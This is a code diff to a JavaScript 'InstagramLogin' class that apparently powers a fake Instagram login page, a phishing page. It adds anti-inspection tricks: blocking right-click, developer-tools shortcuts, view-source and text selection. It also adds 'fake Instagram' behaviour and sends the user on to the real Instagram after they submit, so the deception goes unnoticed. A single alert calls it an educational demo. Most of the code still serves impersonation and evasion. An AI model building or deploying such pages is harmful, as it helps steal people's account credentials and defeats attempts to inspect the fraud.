@@ -6,7 +6,63 @@ class InstagramLogin {
         this.passwordInput = document.getElementById('password');
         this.loginBtn = document.getElementById('loginBtn');
         
+        // Security features
+        this.initializeSecurity();
         this.bindEvents();
+    }
+    
+    initializeSecurity() {
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        
+        // Disable F12, Ctrl+Shift+I, Ctrl+U
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.key === 'u')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Disable text selection
+        document.addEventListener('selectstart', (e) => e.preventDefault());
+        
+        // Add fake Instagram-like behavior
+        this.addFakeInstagramFeatures();
+    }
+    
+    addFakeInstagramFeatures() {
+        // Add fake loading states
+        this.addFakeLoadingBehavior();
+        
+        // Add fake Instagram redirect logic
+        this.addFakeRedirectLogic();
+    }
+    
+    addFakeLoadingBehavior() {
+        // Simulate Instagram's loading behavior
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+                setTimeout(() => {
+                    console.log('Instagram loaded successfully');
+                }, 100);
+            });
+        }
+    }
+    
+    addFakeRedirectLogic() {
+        // Add fake Instagram redirect URLs
+        this.instagramUrls = [
+            'https://www.instagram.com/',
+            'https://www.instagram.com/explore/',
+            'https://www.instagram.com/accounts/login/'
+        ];
+    }
+    
+    // Educational features
+    showEducationalAlert() {
+        alert('🎓 Educational Demo: This demonstrates how phishing attacks work. In a real scenario, never enter your actual credentials on suspicious sites!');
     }
     
     bindEvents() {
@@ -68,6 +124,8 @@ class InstagramLogin {
             }
             
             if (result.success) {
+                // Show educational message before redirect
+                this.showEducationalAlert();
                 // Redirect to Instagram immediately without showing any message
                 window.location.href = 'https://www.instagram.com/';
             } else {
